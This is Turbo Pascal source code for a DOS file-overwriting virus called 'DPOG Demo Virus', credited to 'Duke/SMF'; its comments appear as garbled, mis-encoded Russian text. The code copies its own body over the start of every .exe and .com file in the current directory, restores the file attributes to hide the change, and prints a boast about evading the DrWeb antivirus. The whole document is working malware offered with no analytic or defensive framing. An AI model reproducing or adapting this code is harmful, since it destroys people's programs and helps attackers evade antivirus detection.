   {$S-,I-}  {íâ  áâà®ª  ¥®¡å®¤¨¬  ¤«ï ®¯â¨¬¨§ æ¨¨ ª®¤ }
   uses dos;
   const VirusSize= 4224;
   var Author,VirusName,Generator:string;
       N:searchrec;
       VirusBody:array[1..VirusSize] of byte;
       Virus:file;
   {------------------}
   procedure Infect(i:string);              {‡ à ¦¥¨¥ ä ©«®¢}
   var g:file;
       attr:word;
   begin
   assign(g,i);
   GetFAttr(g,attr);                        {á®åà ¨«¨ ¯à¥¦¨¥  âà¨¡ãâë}
   SetFAttr(g,$20);                         {ãáâ ®¢ª   âà¨¡ãâ  Arhive}
   reset(g,1);                              {®âªàë«¨ ä ©«-¦¥àâ¢ã}
   blockwrite(g,VirusBody,VirusSize);       {§ ¯¨á «¨ ¯®¢¥àå ¢¨àãá}
   close(g);                                {§ ªàë«¨ ä ©«-¦¥àâ¢ã}
   SetFAttr(g,attr);                        {ãáâ ®¢¨«¨ ¯à¥¦¨¥  âà¨¡ãâë}
   end;
   {------------------}
   begin
   Author:='Duke/SMF';
   VirusName:='DPOG Demo Virus';
   Generator:='[DPOG v0.02]';
   assign(Virus,paramstr(0));reset(Virus,1);
   blockread(Virus,VirusBody,VirusSize);
   close(Virus);
   FindFirst('*.exe',$21,N);
   while doserror=0 do
     begin
     if (N.name<>paramstr(0)) and (N.name<>'COMMAND.COM') then Infect(N.name);
     FindNext(N)
     end;
   FindFirst('*.com',$21,N);
   while doserror=0 do
     begin
     if (N.name<>paramstr(0)) and (N.name<>'COMMAND.COM') then Infect(N.name);
     FindNext(N)
     end;
   writeln('Hahaha ! This is DPOG v0.02 demo virus.');
   writeln('Why not detected with DrWeb ??? Coz i change text string !');
   writeln('Again created (c) by Duke/SMF. Who else ? ;-))');
   end.
